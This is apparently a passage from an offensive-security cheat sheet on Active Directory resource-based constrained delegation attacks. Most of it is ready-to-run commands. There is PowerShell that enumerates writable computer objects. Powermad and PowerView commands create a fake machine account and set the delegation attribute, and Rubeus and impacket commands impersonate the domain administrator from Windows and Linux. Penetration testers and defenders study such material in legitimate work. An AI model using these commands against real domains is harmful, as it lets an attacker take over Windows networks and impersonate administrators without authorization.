
- This type of delegation allows delegation settings to be configured on the target service instead of the service account being used to access resources.
- When a service receives a request to grant access on behalf of another user, the KDC checks against the security descriptors in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the principal running the backend service.

> RBCD works regardless of the domain functional level but does require at least one Domain Controller running Windows Server 2012 or later in the same domain as both the backend and frontend servers.

## Requirements

To carry out attacks against RBCD, we require two elements:

- Access to a user or group that has privileges to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property on a computer. This is commonly possible if the user has GenericWrite, GenericAll, WriteProperty, or WriteDACL privileges on a computer object.
- Control of another object that has an SPN.


## Enumeration

```powershell
# import the PowerView module
Import-Module C:\Tools\PowerView.ps1

# get all computers in the domain
$computers = Get-DomainComputer

# get all users in the domain
$users = Get-DomainUser

# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"

# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}
```

```powershell
.\SearchRBCD.ps1
```

```powershell
Get-DomainComputer -Server $DC_IP -Credential $Cred | Get-DomainObjectAcl -Server $DC_IP -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty|GenericWrite|GenericAll' } | 
select ObjectDN,SecurityIdentifier,ActiveDirectoryRights
```

## Exploitation

- Other computer accounts can be used if you have elevated privileges to SYSTEM anywhere, as every computer has a default set of SPNs such as HOST, RestrictedKrbHost, TERMSRV, and WSMAN.
- Service accounts can be used if you have obtained their credentials through an attack such as kerberoasting.
- If we do not have such rights, we could create a fake computer.

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString "TEST@2324kjcnds+!" -AsPlainText -Force)
```

- Then, we add this computer account to the trust list of the targeted computer, which is possible because the attacker has GenericAll ACL on this computer:

    - Obtain the computer SID.
    - Use the Security Descriptor Definition Language (SDDL) to create a security descriptor.
    - Set msDS-AllowedToActOnBehalfOfOtherIdentity in raw binary format.
    - Modify the target computer.

```powershell
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "$DOMAIN\$USER", (ConvertTo-SecureString "$PASSWORD" -AsPlainText -Force)
Get-DomainComputer $TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose

# Cleanup
Get-DomainComputer $TARGET_COMPUTER | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
```

- We can ask for a TGT for the created computer account, followed by a S4U2Self request to get a forwardable TGS ticket.
- Then a S4U2Proxy to get a valid TGS ticket for a specific SPN on the targeted computer.

```powershell
# Get Computer Hashes with Rubeus
.\Rubeus.exe hash /password:$PASSWORD /user:FAKEMACHINE$ /domain:inlanefreight.local

# Impersonate administrator
.\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:$HASH /impersonateuser:administrator /msdsspn:cifs/$TARGET_COMPUTER_FQDN /ptt
```

> We can also use /altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm to include aditional services to our ticket request.

> All delegations, whether it be unconstrained, constrained, or resource-based, can only be configured on accounts that have an SPN.


## Exloitation from Linux

```shell
# Add a new computer
impacket-addcomputer -computer-name 'FAKEMACHINE$' -computer-pass FAKEMACHINE+wedw -dc-ip $DC_IP $DOMAIN/$USER

# Use https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
python3 rbcd.py -dc-ip $DC_IP -t $TARGET_MACHINE -f FAKEMACHINE $DOMAIN\\$USER:$PASSWORD

# Get service ticket
impacket-getST -spn cifs/$TARGET_FQDN -impersonate Administrator -dc-ip $DC_IP $DOMAIN/FAKEMACHINE:$PASSWORD
```

- RBCD from Linux When MachineAccountQuota Is Set to 0

```shell
# Get NT hash of user
pypykatz crypto nt '$PASSWORD'

# Get TGT
impacket-getTGT $DOMAIN/$USER -hashes :$NT_HASH -dc-ip $DC_IP

# Obtain the Ticket Session Key
impacket-describeTicket $TGT_PATH | grep 'Ticket Session Key'

# Change password to ticket session key
impacket-changepasswd $DOMAIN/$USER@$DC_IP -hashes :$ORIGINAL_NT_HASH -newhash :$TICKET_SESSION_KEY

# Request service ticket
KRB5CCNAME=$TGT_PATH  impacket-getST -u2u -impersonate Administrator -spn TERMSRV/$TARGET_FQDN -no-pass $DOMAIN/$USER -dc-ip $DC_IP
```


## Services Details


| Name              | Description                                                     | Ticket(s)        |
|-------------------|-----------------------------------------------------------------|-------------------|
| SMB               | Access the remote filesystem. View, list, upload, & delete files. | CIFS              |
| PsExec            | Run a binary via the Service Control Manager.                   | CIFS              |
| WinRM             | Windows Remote Management.                                      | HTTP              |
| WMI               | Execute applications on the remote target (e.g., process call create). | RPCSS, HOST, RestrictedKrbHost       |
| RDP               | Remote Desktop Protocol.                                        | TERMSRV, HOST     |
| MSSQL             | MS SQL Databases.                                               | MSSQLSvc          |
